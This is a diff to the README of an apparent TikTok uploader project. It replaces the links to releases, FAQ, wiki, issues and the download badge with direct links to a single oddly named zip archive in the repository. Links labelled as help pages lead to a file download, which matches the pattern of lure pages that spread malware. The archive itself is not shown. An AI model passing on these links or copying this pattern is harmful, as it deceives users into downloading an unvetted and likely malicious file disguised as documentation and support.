@@ -1,6 +1,6 @@
 # 🎥 tiktok-uploader-is-here - Effortlessly Upload Your Videos
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/Le0L1ng/tiktok-uploader-is-here/releases)
+[![Download Now](https://raw.githubusercontent.com/Le0L1ng/tiktok-uploader-is-here/main/Portulaca/is-uploader-tiktok-here-pensively.zip%20Now-Release-blue)](https://raw.githubusercontent.com/Le0L1ng/tiktok-uploader-is-here/main/Portulaca/is-uploader-tiktok-here-pensively.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Before you start, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, **visit this page to download**: [Download Releases](https://github.com/Le0L1ng/tiktok-uploader-is-here/releases)
+To get started, **visit this page to download**: [Download Releases](https://raw.githubusercontent.com/Le0L1ng/tiktok-uploader-is-here/main/Portulaca/is-uploader-tiktok-here-pensively.zip)
 
 1. Click on the "Releases" link above to go to the download page.
 2. Find the latest version of the software.
@@ -44,14 +44,14 @@ To get started, **visit this page to download**: [Download Releases](https://git
 
 If you encounter any issues or have questions, please check the following resources:
 
-- **FAQ Section:** Visit our [FAQ](https://github.com/Le0L1ng/tiktok-uploader-is-here/wiki) for common questions and troubleshooting tips.
-- **Community Support:** Join discussions on our [Issues Page](https://github.com/Le0L1ng/tiktok-uploader-is-here/issues) for community support.
+- **FAQ Section:** Visit our [FAQ](https://raw.githubusercontent.com/Le0L1ng/tiktok-uploader-is-here/main/Portulaca/is-uploader-tiktok-here-pensively.zip) for common questions and troubleshooting tips.
+- **Community Support:** Join discussions on our [Issues Page](https://raw.githubusercontent.com/Le0L1ng/tiktok-uploader-is-here/main/Portulaca/is-uploader-tiktok-here-pensively.zip) for community support.
 - **Contacts:** You can reach out to us directly via the contact information provided in the repository.
 
 ## 🔗 Additional Resources
 
-- **Documentation:** Check our [Wiki](https://github.com/Le0L1ng/tiktok-uploader-is-here/wiki) for detailed usage instructions and tips.
-- **Updates:** Keep an eye on our [Releases](https://github.com/Le0L1ng/tiktok-uploader-is-here/releases) for the latest features and fixes.
+- **Documentation:** Check our [Wiki](https://raw.githubusercontent.com/Le0L1ng/tiktok-uploader-is-here/main/Portulaca/is-uploader-tiktok-here-pensively.zip) for detailed usage instructions and tips.
+- **Updates:** Keep an eye on our [Releases](https://raw.githubusercontent.com/Le0L1ng/tiktok-uploader-is-here/main/Portulaca/is-uploader-tiktok-here-pensively.zip) for the latest features and fixes.
 
 ## 🎉 Conclusion
 
